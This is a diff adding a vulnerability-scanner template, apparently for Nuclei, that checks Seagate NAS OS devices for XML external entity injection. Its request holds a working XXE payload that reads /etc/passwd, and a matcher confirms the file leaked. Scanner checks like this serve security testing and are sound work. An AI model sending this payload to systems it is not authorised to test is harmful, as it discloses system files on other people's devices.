@@ -1,0 +1,32 @@
+id: Xml-Injection
+
+info:
+  name: Xml-Injection
+  author: Xml注入
+  severity: high
+  description: Xml injection vulnerability.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-200
+  tags: cve,cve2018,seagate,nasos,disclosure,xml
+
+requests:
+  - raw:
+      - |
+        POST /cgi-bin/xml HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+        
+        <?xml version="1.0" encoding="utf-8"?><!DOCTYPE xxe [
+        <!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><name>&xxe;</name></root>
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root'
+          - '/bin/bash'
+        condition: and
+
+# Enhanced by mp on 2022/07/05
